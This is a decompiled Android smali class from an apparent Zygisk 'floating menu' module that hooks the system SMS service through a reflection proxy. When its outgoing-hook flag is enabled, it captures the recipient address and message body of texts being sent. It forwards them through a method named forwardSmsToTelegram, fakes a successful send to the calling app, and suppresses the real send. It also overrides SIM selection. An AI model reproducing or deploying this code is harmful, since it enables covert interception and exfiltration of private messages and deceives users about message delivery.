.class Lcom/floatingmenu/MenuLoader$3;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/reflect/InvocationHandler;


# instance fields
.field final synthetic val$realISms:Ljava/lang/Object;


# direct methods
.method public constructor <init>(Ljava/lang/Object;)V
    .registers 2

    iput-object p1, p0, Lcom/floatingmenu/MenuLoader$3;->val$realISms:Ljava/lang/Object;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public invoke(Ljava/lang/Object;Ljava/lang/reflect/Method;[Ljava/lang/Object;)Ljava/lang/Object;
    .registers 12

    invoke-virtual {p2}, Ljava/lang/reflect/Method;->getName()Ljava/lang/String;

    move-result-object p1

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "ISms proxy method called: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "ZygiskMenu @Hivirtus"

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const-string v0, "asBinder"

    invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_29

    const-string p1, "Intercepted asBinder(), returning sISmsBinderProxy"

    invoke-static {v1, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    # getter for: Lcom/floatingmenu/MenuLoader;->sISmsBinderProxy:Landroid/os/IBinder;
    invoke-static {}, Lcom/floatingmenu/MenuLoader;->access$1000()Landroid/os/IBinder;

    move-result-object p1

    return-object p1

    :cond_29
    const-string v0, "isSmsSimPickActivityNeeded"

    invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_39

    const-string p1, "Intercepted isSmsSimPickActivityNeeded(), returning false"

    invoke-static {v1, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    sget-object p1, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    return-object p1

    :cond_39
    const-string v0, "getPreferredSmsSubscription"

    invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_62

    sget-boolean p1, Lcom/floatingmenu/MenuLoader;->sSim1Enabled:Z

    const/4 p2, 0x1

    if-eqz p1, :cond_47

    goto :goto_4c

    :cond_47
    sget-boolean p1, Lcom/floatingmenu/MenuLoader;->sSim2Enabled:Z

    if-eqz p1, :cond_4c

    const/4 p2, 0x2

    :cond_4c
    :goto_4c
    new-instance p1, Ljava/lang/StringBuilder;

    const-string p3, "Intercepted getPreferredSmsSubscription(), returning "

    invoke-direct {p1, p3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p1, p2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v1, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-static {p2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object p1

    return-object p1

    :cond_62
    const-string v0, "sendText"

    invoke-virtual {p1, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_72

    const-string v0, "sendMultipartText"

    invoke-virtual {p1, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_132

    :cond_72
    const-string v0, "Intercepted SMS Method call: "

    invoke-virtual {v0, p1}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-static {v1, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const/4 p1, 0x0

    const/4 v0, 0x0

    move-object v3, v0

    move-object v4, v3

    if-eqz p3, :cond_cc

    const/4 v2, 0x0

    :goto_82
    array-length v5, p3

    if-ge v2, v5, :cond_cc

    aget-object v5, p3, v2

    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "  Arg["

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v7, "]: "

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    if-eqz v5, :cond_9d

    invoke-virtual {v5}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v7

    goto :goto_9f

    :cond_9d
    const-string v7, "null"

    :goto_9f
    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v1, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    instance-of v6, v5, Ljava/lang/String;

    if-eqz v6, :cond_c9

    check-cast v5, Ljava/lang/String;

    invoke-virtual {v5}, Ljava/lang/String;->length()I

    move-result v6

    const/16 v7, 0x14

    if-ge v6, v7, :cond_c1

    const-string v6, " "

    invoke-virtual {v5, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-nez v6, :cond_c1

    move-object v3, v5

    goto :goto_c9

    :cond_c1
    invoke-virtual {v5}, Ljava/lang/String;->length()I

    move-result v6

    const/4 v7, 0x5

    if-le v6, v7, :cond_c9

    move-object v4, v5

    :cond_c9
    :goto_c9
    add-int/lit8 v2, v2, 0x1

    goto :goto_82

    :cond_cc
    sget-boolean v2, Lcom/floatingmenu/FloatingMenu;->sHookOutgoing:Z

    if-eqz v2, :cond_132

    const-string p2, "sHookOutgoing is enabled! Mocking SMS success..."

    invoke-static {v1, p2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    if-eqz v3, :cond_da

    # setter for: Lcom/floatingmenu/MenuLoader;->sLastSentAddress:Ljava/lang/String;
    invoke-static {v3}, Lcom/floatingmenu/MenuLoader;->access$1102(Ljava/lang/String;)Ljava/lang/String;

    :cond_da
    if-eqz v4, :cond_df

    # setter for: Lcom/floatingmenu/MenuLoader;->sLastSentBody:Ljava/lang/String;
    invoke-static {v4}, Lcom/floatingmenu/MenuLoader;->access$1202(Ljava/lang/String;)Ljava/lang/String;

    :cond_df
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v5

    # setter for: Lcom/floatingmenu/MenuLoader;->sLastSentTime:J
    invoke-static {v5, v6}, Lcom/floatingmenu/MenuLoader;->access$1302(J)J

    if-eqz v3, :cond_ed

    if-eqz v4, :cond_ed

    invoke-static {v3, v4}, Lcom/floatingmenu/FloatingMenu;->forwardSmsToTelegram(Ljava/lang/String;Ljava/lang/String;)V

    :cond_ed
    if-eqz p3, :cond_117

    array-length p2, p3

    const/4 v2, 0x0

    :goto_f1
    if-ge v2, p2, :cond_117

    aget-object v3, p3, v2

    instance-of v4, v3, Landroid/app/PendingIntent;

    if-eqz v4, :cond_fd

    check-cast v3, Landroid/app/PendingIntent;

    move-object p1, v0

    goto :goto_119

    :cond_fd
    instance-of v4, v3, Ljava/util/List;

    if-eqz v4, :cond_114

    check-cast v3, Ljava/util/List;

    invoke-interface {v3}, Ljava/util/List;->isEmpty()Z

    move-result v4

    if-nez v4, :cond_114

    invoke-interface {v3, p1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v4

    instance-of v4, v4, Landroid/app/PendingIntent;

    if-eqz v4, :cond_114

    move-object p1, v3

    move-object v3, v0

    goto :goto_119

    :cond_114
    add-int/lit8 v2, v2, 0x1

    goto :goto_f1

    :cond_117
    move-object p1, v0

    move-object v3, p1

    :goto_119
    if-nez v3, :cond_124

    if-eqz p1, :cond_11e

    goto :goto_124

    :cond_11e
    const-string p1, "No PendingIntent callback found in method arguments."

    invoke-static {v1, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_131

    :cond_124
    :goto_124
    new-instance p2, Ljava/lang/Thread;

    new-instance p3, Lcom/floatingmenu/MenuLoader$3$1;

    invoke-direct {p3, p0, v3, p1}, Lcom/floatingmenu/MenuLoader$3$1;-><init>(Lcom/floatingmenu/MenuLoader$3;Landroid/app/PendingIntent;Ljava/util/List;)V

    invoke-direct {p2, p3}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {p2}, Ljava/lang/Thread;->start()V

    :goto_131
    return-object v0

    :cond_132
    iget-object p1, p0, Lcom/floatingmenu/MenuLoader$3;->val$realISms:Ljava/lang/Object;

    invoke-virtual {p2, p1, p3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object p1

    return-object p1
.end method
